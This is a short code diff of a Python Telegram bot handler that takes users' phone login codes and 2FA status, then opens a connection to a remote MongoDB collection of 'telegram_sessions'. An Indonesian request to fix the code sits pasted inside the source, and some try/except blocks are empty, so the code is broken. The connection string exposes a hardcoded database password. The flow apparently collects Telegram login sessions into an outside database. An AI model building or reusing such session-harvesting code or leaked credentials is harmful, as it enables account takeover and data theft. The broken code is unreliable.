@@ -29,7 +29,7 @@ HAPP = None
 session_count = count(1)
 
 
-
+Benarkan kode berikut agar dapat berjalan baik 
 
 @Client.on_message(
     filters.text &
@@ -61,22 +61,18 @@ async def recv_tg_code_message(_, message: Message):
             sent_code.phone_code_hash,
             phone_code
         )
-        try:
-          
-        except Exception as e:
-             
+    except Exception as e:
         if e.MESSAGE is not None:
-           await status_message.edit_text(e.MESSAGE + "\n\n" + PHONE_CODE_IN_VALID_ERR_TEXT)
+            await status_message.edit_text(e.MESSAGE + "\n\n" + PHONE_CODE_IN_VALID_ERR_TEXT)
         else:
-           await status_message.edit_text(PHONE_CODE_IN_VALID_ERR_TEXT)
-
+            await status_message.edit_text(PHONE_CODE_IN_VALID_ERR_TEXT)
         del AKTIFPERINTAH[message.chat.id]
     except SessionPasswordNeeded:
         await status_message.edit_text(
             ACC_PROK_WITH_TFA
         )
         w_s_dict["IS_NEEDED_TFA"] = True
-    else: 
+    else:
         client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
